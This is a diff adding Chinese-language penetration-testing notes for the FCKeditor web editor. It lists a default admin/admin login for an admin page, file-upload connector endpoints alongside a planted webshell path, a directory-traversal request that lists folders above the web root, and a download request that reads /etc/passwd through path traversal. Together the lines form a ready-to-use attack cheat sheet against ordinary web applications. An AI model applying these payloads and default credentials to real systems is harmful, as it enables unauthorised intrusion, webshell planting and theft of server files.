@@ -1,2 +1,28 @@
 http://127.0.0.1/fckeditor/editor/dialog/fck_about.html
 http://127.0.0.1/FCKeditor/_whatsnew.html
+
+弱口令
+/admin/admin_index.asp  admin/admin
+
+
+文件上传
+/upload/fckeditor/
+webshell路径： /upload/fckeditor/weshell.aspx
+
+/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/  （文件上传）
+
+/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=FIle&CurrentFolder=/&uuid=149124922312
+
+/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector
+
+/FCKeditor/editor/filemanager/connectors/php/connector.php
+
+/FCKeditor/editor/filemanager/connectors/asp/connector.asp
+
+
+
+信息泄露
+/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../
+
+文件下载
+/uploadfile?istrade=istrade&filename=../../../../../etc/passwd
